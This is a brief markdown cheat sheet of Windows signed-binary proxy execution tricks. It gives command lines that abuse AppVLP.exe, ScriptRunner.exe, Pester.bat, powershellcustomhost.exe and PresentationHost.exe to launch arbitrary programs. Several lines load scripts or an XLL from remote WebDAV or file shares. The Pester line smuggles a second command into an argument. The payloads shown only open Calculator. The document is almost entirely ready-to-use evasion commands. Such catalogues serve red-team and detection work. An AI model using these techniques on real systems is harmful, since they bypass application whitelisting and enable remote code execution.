# Code Execution...
Generally useless ways to exec code.

## appvlp.exe
```
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe \\webdav\calc.bat
```

## scriptrunner.exe
```
C:\Windows\System32\ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
C:\Windows\System32\ScriptRunner.exe -appvscript powershell.exe -args
```

## pester.bat
```
C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Get-Process"
```

##  powershellcustomhost.exe (Likely installed with IIS)
```
C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe calc.ps1
```

## presentationhost.exe 
```
PresentationHost.exe file://c:\windows\system32\calc.exe
```
